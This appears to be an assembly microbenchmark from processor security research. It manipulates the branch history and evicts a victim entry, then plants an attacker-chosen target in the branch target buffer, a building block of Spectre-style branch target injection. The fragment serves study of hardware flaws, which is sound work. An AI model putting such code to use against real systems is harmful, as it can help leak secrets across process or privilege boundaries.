%include "./SET_ATTACKER_PHR0.nasm"
%include "./SET_ATTACKER_PHR1.nasm"

%define nthreads 1
%define repeat0  10
%define repeat1  1000
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 0
%endmacro

%macro testcode 0   ; main test

    ; evict the victim from the IBP
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    call attacker_evict

    SERIALIZE

    xor qword[UserData], 1
    mfence
    call attacker_evict

    SERIALIZE

    ; inject the malicious target into the BTB entry
    %rep 15
     mov rax, sec_attacker_ibranch_addr
     call rax 
    %endrep

%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro

SECTION .sec_attacker_ibranch exec
attacker_ibranch:
    %rep 143
     nop
    %endrep
    lea r10, [inject_t]
    jmp r10
    %rep 64 
     nop
    %endrep

SECTION .sec_inject_target exec
    %rep 33
     nop
    %endrep
inject_t:   ; aliased with the malicious target in victim in the lowest 32 bits
    %rep 64
     nop
    %endrep
    ret

SECTION .sec_attacker_evict exec
attacker_evict:
    %assign i 0
    %rep 6
        mov rdx, qword[UserData]
        lea r10, [attacker_target_0_%+ i]
        lea r9, [attacker_target_1_%+ i]
        cmp rdx, 1
        cmovz r10, r9
        mfence

        cmp rdx, 1
        je attacker_set_PHR1_start_%+ i
        SHIFT_PHR 195,i
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR0 i

    attacker_set_PHR1_start_%+ i:
        %assign j i+10
        SHIFT_PHR 195,j
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR1 i
    attacker_set_PHR1_end_%+ i:

        %rep i<<6
         nop
        %endrep
        jmp r10
        %rep 64 
         nop
        %endrep
    attacker_target_0_%+ i:
        %rep 64
         nop
        %endrep
    attacker_target_1_%+ i:
        %rep 64
         nop
        %endrep
    %assign i i+1
    %endrep
    ret